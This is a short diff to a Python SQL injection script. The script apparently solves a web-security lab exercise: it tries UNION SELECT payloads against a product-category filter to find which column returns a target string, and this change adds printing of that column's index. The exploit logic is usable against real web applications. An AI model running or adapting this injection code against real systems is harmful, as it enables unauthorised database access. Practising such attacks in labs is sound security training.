@@ -20,14 +20,14 @@ def exploit_sqli_add_text(num_col):
 	for i in range(0,num_col):
 		arr.append('NULL')
 	for i in range(0,num_col):
-		arr[i] = "'text'"
-		arr_result = exploit_sqli_payload(arr)
+		arr[i] = "'3EZwrc'" # Target text to be inserted
+		arr_result = exploit_sqli_payload(arr, i)
 		if arr_result:
 			return True
 		arr[i] = 'NULL'
 	return False
 
-def exploit_sqli_payload(arr):
+def exploit_sqli_payload(arr, col):
 	uri = '/filter?category=Gifts'
 	payload = "' union select"
 	comma = False # Used to avoid "select,"
@@ -42,6 +42,7 @@ def exploit_sqli_payload(arr):
 	if 'Internal Server Error' in r.text:
 		return False
 	print('[+] Payload:', payload)
+	print('[+] Index of column that contains target:', col)
 	return True
 
 if __name__ == '__main__':
